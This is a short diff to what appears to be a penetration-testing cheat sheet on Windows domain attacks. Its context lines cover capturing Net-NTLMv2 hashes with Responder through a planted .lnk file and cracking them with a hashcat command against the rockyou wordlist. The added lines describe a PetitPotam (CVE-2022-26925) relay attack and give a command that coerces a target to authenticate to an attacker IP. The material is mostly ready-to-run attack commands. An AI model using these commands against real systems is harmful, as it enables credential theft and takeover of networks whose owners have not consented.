@@ -21,3 +21,9 @@ Use responder to capture Net-NTLMv2 hash, then crack it with hashcat. The scenar
 Then upload a .lnk file or similar to the target share/folder that points to our responder IP so that the victim will trigger the file and finally capture his hash.
 
         hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+3) PetitPotam (Unauth) CVE-2022-26925
+
+If SMB signing is not enabled/enforced, you can conduct relay attacks. PetitPotam is one of them
+
+        python3 PetitPotam.py -d DOMAIN ATTACK_IP TARGET_IP
